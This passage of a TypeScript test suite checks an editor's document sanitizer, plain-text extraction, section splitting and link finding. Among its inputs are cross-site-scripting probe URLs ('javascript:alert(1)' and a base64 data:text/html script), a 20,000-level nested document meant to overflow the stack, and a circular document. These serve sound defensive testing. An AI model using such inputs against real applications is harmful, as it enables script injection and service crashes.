          " ",
          text("good", "bold", { href: "https://example.com" }),
        ),
        image("javascript:alert(1)", "described"),
        image("data:text/html;base64,PHNjcmlwdD4=", null),
        image("  https://example.com/ok.png  ", "ok"),
      ),
    );
    expect(clean.content).toEqual([
      p("bad data ", { type: "text", text: "good", marks: [{ type: "bold" }, { type: "link", attrs: { href: "https://example.com" } }] }),
      p("described"),
      image("https://example.com/ok.png", "ok", null),
    ]);
    expectHarmless(clean as PMNode);
  });

  it("repairs structure so the editor can always open the result", () => {
    const clean = sanitizeDoc(
      doc(
        {
          type: "bulletList",
          content: [
            p("paragraph straight in a list"),
            task(true, p("task item in a bullet list")),
            li({ type: "codeBlock", attrs: { language: null }, content: [text("code first")] }),
            li(),
          ],
        },
        { type: "bulletList", content: [] },
        { type: "taskList" },
        { type: "blockquote" },
        { type: "table", content: [cell("tableCell", p("cell straight in a table")), row(), row(p("paragraph straight in a row"))] },
        {
          type: "details",
          content: [
            p("no summary"),
            { type: "detailsSummary", content: [text("S", "bold"), { type: "hardBreak" }, pageLink("n1", "link")] },
            { type: "detailsSummary", content: [text("second summary")] },
          ],
        },
        { type: "heading", attrs: { level: 1 }, content: [p("paragraph in a heading"), text("!")] },
        { type: "doc", content: [p("nested doc")] },
      ),
    );
    expect(clean.content).toEqual([
      {
        type: "bulletList",
        content: [
          li(p("paragraph straight in a list")),
          li(p("task item in a bullet list")),
          li(p(), { type: "codeBlock", attrs: { language: null }, content: [text("code first")] }),
          li(p()),
        ],
      },
      { type: "blockquote", content: [p()] },
      {
        type: "table",
        content: [row(cell("tableCell", p("cell straight in a table"))), row(cell("tableCell", p("paragraph straight in a row")))],
      },
      {
        type: "details",
        content: [
          { type: "detailsSummary", content: [text("S", "bold"), text(" link")] },
          { type: "detailsContent", content: [p("no summary"), p("second summary")] },
        ],
      },
      h(1, "paragraph in a heading!"),
      p("nested doc"),
    ]);
    expect(sanitizeDoc(clean)).toEqual(clean);
    expect(sanitizeDoc({ type: "doc" }).content).toEqual([p()]);
    expect(sanitizeDoc({ type: "doc", content: "nope" }).content).toEqual([p()]);
  });

  it("flattens nesting beyond the depth limit and survives hostile depth", () => {
    let nested: PMNode = p("the bottom");
    for (let level = 0; level < 100; level += 1) nested = { type: "blockquote", content: [nested] };
    const clean = sanitizeDoc(doc(nested));
    let depth = 0;
    walk(clean as PMNode, () => {
      depth += 1;
    });
    expect(depth).toBeLessThanOrEqual(43);
    expect(docToText(clean)).toBe("the bottom");

    // Deep enough to overflow the stack of any recursive walk.
    let hostile: PMNode = { type: "unknown", text: "x" };
    for (let level = 0; level < 20_000; level += 1) hostile = { type: level % 2 ? "blockquote" : "mystery", content: [hostile] };
    let result: unknown;
    try {
      result = sanitizeDoc(doc(hostile));
    } catch (error) {
      result = error;
    }
    // Either flattened or refused with a message for the person; never a crash.
    if (result instanceof Error) expect(result).toMatchObject({ code: "bad_request" });
    else expect(docToText(result as PMNode)).toBe("x");
  });

  it("refuses what is not a document and what is too large", () => {
    for (const input of [null, undefined, "text", 5, [], {}, { type: "paragraph" }, { content: [] }]) {
      expect(() => sanitizeDoc(input), JSON.stringify(input)).toThrow(/not a document/);
    }
    const big = doc(p("x".repeat(5 * 1024 * 1024)));
    expect(() => sanitizeDoc(big)).toThrow(/too large/);
    expect(() => sanitizeDoc(doc(p("small")), { maxBytes: 10 })).toThrow(expect.objectContaining({ code: "too_large", status: 413 }));
    const circular: PMNode = { type: "doc", content: [] };
    circular.content!.push(circular);
    expect(() => sanitizeDoc(circular)).toThrow(expect.objectContaining({ code: "bad_request" }));
  });
});

describe("text, sections and links", () => {
  const page = doc(
    p("Intro before any heading."),
    h(1, "Water"),
    p("Boil it ", text("hard", "bold"), ".", { type: "hardBreak" }, "Then cool. See ", pageLink("n1", "Filters"), "."),
    { type: "callout", attrs: { variant: "warning" }, content: [h(3, "Careful"), p("Chlorine needs thirty minutes.")] },
    {
      type: "table",
      content: [
        row(cell("tableHeader", p("Method")), cell("tableHeader", p("Time"))),
        row(cell("tableCell", p("Boiling")), cell("tableCell", p("1 min"), p("3 min at altitude"))),
      ],
    },
    { type: "codeBlock", attrs: { language: "sh" }, content: [text("purify --tablets 2")] },
    h(2, "Fire"),
    { type: "bulletList", content: [li(p("Tinder")), li(p("Kindling"), { type: "taskList", content: [task(false, p("Dry sticks"))] })] },
    image("/api/attachments/a1", "Fire lay diagram"),
    { type: "documentEmbed", attrs: { documentId: "d1", title: "Stove manual" } },
    {
      type: "details",
      content: [
        { type: "detailsSummary", content: [text("Troubleshooting")] },
        { type: "detailsContent", content: [p("Wet wood smokes.")] },
      ],
    },
    { type: "horizontalRule" },
    h(2, "Empty section"),
  );

  it("reads a page as plain text", () => {
    expect(docToText(page)).toBe(
      [
        "Intro before any heading.",
        "Water",
        "Boil it hard.\nThen cool. See Filters.",
        "Careful",
        "Chlorine needs thirty minutes.",
        "Method | Time",
        "Boiling | 1 min 3 min at altitude",
        "purify --tablets 2",
        "Fire",
        "Tinder",
        "Kindling",
        "Dry sticks",
        "Fire lay diagram",
        "Stove manual",
        "Troubleshooting",
        "Wet wood smokes.",
        "Empty section",
      ].join("\n"),
    );
    expect(docToText(null)).toBe("");
    expect(docToText(doc(p()))).toBe("");
  });

  it("splits a page into sections at its headings", () => {
    const sections = docToSections(page);
    expect(sections.map((section) => section.heading)).toEqual([undefined, "Water", "Fire", "Empty section"]);
    expect(sections[0]!.text).toBe("Intro before any heading.");
    // Tables, callouts (with their inner heading), code and page link labels are all text.
    expect(sections[1]!.text).toBe(
      "Boil it hard.\nThen cool. See Filters.\nCareful\nChlorine needs thirty minutes.\nMethod | Time\nBoiling | 1 min 3 min at altitude\npurify --tablets 2",
    );
    expect(sections[2]!.text).toBe("Tinder\nKindling\nDry sticks\nFire lay diagram\nStove manual\nTroubleshooting\nWet wood smokes.");
    // A heading with nothing under it yet can still be found.
    expect(sections[3]).toEqual({ heading: "Empty section", text: "Empty section" });
    expect(docToSections(doc(p()))).toEqual([]);
    expect(docToSections(undefined)).toEqual([]);
  });

  it("finds links to pages, documents and attachments", () => {
    const linked = doc(
      p(
        pageLink("n1", "One"),
        pageLink("n1", "One again"),
        text("typed", { href: "/notes/n2" }),
        text("anchor", { href: "/notes/n3#part" }),
        text("elsewhere", { href: "https://example.com/notes/n9" }),
      ),
      p(
        text("doc link", { href: "/library/documents/d2?page=4" }),
        text("file", { href: "/api/attachments/a3" }),
        text("not a route", { href: "/notes/" }),
      ),
      { type: "documentEmbed", attrs: { documentId: "d1", title: "Manual" } },
      image("/api/attachments/a1", null),
      image("https://example.com/api/attachments/a9", null),
      { type: "table", content: [row(cell("tableCell", image("/api/attachments/a2", null), p(pageLink("n4", "In a table"))))] },
      {
        type: "callout",
        attrs: { variant: "info" },
        content: [
          { type: "details", content: [{ type: "detailsSummary" }, { type: "detailsContent", content: [p(pageLink("n5", "Deep"))] }] },
        ],
      },
    );
    expect(extractLinks(linked)).toEqual({
      noteIds: ["n1", "n2", "n3", "n4", "n5"],
      documentIds: ["d2", "d1"],
      attachmentIds: ["a3", "a1", "a2"],
    });
    expect(extractLinks(null)).toEqual({ noteIds: [], documentIds: [], attachmentIds: [] });
  });
});
